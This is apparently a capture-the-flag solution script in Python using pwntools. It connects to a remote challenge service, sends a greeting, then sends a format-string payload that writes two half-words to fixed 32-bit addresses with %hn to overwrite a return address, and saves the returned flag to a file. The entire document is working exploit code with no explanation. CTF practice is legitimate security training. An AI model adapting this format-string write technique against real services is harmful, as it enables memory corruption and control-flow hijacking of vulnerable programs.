from pwn import *

import struct


def little_endian(num):
	return struct.pack('<Q', num)


p = remote('tulactf.ru',5555)


ret_addr2 = b'\xa2\xb2\x04\x08\xa0\xb2\x04\x08%2044x%4$hn%35234x%5$hn'

payload = b"hello"

p.sendline(payload)

payload = ret_addr2

p.sendline(payload)

flag = p.recvall()


print(flag)

with open('data.bin', 'wb') as f:
	f.write(flag)

